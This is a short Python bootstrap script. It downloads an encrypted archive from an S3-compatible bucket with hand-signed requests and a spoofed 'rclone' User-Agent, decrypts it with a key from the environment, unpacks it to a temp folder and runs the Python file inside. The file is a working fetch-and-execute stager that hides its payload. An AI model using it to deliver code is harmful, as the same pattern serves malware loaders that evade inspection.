#!/usr/bin/env python3
"""Bootstrap: fetch payload, decrypt, hand over to the runtime."""

import base64
import hashlib
import hmac
import io
import os
import subprocess
import sys
import tempfile
import urllib.request
import zipfile
from datetime import datetime, timezone
from pathlib import Path

UA = "rclone/v1.65.5"


def _sign(key, message):
    return hmac.new(key, message.encode(), hashlib.sha256).digest()


def get_object(endpoint, bucket, ak, sk, key, region="us-east-1"):
    scheme, host = endpoint.split("://", 1)
    path = "/%s/%s" % (bucket, key)
    now = datetime.now(timezone.utc)
    stamp = now.strftime("%Y%m%dT%H%M%SZ")
    day = now.strftime("%Y%m%d")
    payload = hashlib.sha256(b"").hexdigest()
    headers = "host:%s\nx-amz-content-sha256:%s\nx-amz-date:%s\n" % (host, payload, stamp)
    signed = "host;x-amz-content-sha256;x-amz-date"
    canonical = "\n".join(["GET", path, "", headers, signed, payload])
    scope = "%s/%s/s3/aws4_request" % (day, region)
    to_sign = "\n".join(["AWS4-HMAC-SHA256", stamp, scope,
                        hashlib.sha256(canonical.encode()).hexdigest()])
    key_bytes = _sign(("AWS4" + sk).encode(), day)
    key_bytes = _sign(key_bytes, region)
    key_bytes = _sign(key_bytes, "s3")
    key_bytes = _sign(key_bytes, "aws4_request")
    signature = hmac.new(key_bytes, to_sign.encode(), hashlib.sha256).hexdigest()
    request = urllib.request.Request("%s://%s%s" % (scheme, host, path))
    request.add_header("Host", host)
    request.add_header("User-Agent", UA)
    request.add_header("x-amz-date", stamp)
    request.add_header("x-amz-content-sha256", payload)
    request.add_header("Authorization",
                       "AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s"
                       % (ak, scope, signed, signature))
    with urllib.request.urlopen(request, timeout=90) as response:
        return response.read()


def main():
    env = os.environ
    blob = get_object(env["F1_ENDPOINT"], env["F1_BUCKET"], env["F1_ACCESS_KEY"],
                      env["F1_SECRET_KEY"], env.get("E1_NAME", "d/e.bin"))
    from nacl.secret import SecretBox
    raw = SecretBox(base64.b64decode(env["ENGINE_KEY"])).decrypt(blob)
    work = Path(tempfile.gettempdir()) / "e"
    work.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(io.BytesIO(raw)) as archive:
        archive.extractall(work)
    target = work / "e0.py"
    return subprocess.call([sys.executable, str(target)] + sys.argv[1:], cwd=str(work))


if __name__ == "__main__":
    sys.exit(main())
